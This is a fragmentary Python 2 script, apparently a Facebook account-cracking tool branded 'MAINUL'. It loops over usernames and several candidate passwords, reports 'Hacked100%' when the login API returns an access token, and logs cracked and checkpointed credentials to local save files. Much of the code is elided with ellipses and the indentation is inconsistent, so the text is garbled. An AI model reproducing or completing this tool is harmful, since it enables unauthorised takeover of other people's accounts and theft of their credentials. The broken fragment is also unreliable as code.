	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m{𝐌𝐀𝐈𝐍𝐔𝐋-Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[𝐌𝐀𝐈𝐍𝐔𝐋-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{𝐌𝐀𝐈𝐍𝐔𝐋-Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[𝐌𝐀𝐈𝐍𝐔𝐋-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{𝐌𝐀𝐈𝐍𝐔𝐋-Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{𝐌𝐀𝐈𝐍𝐔𝐋-Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
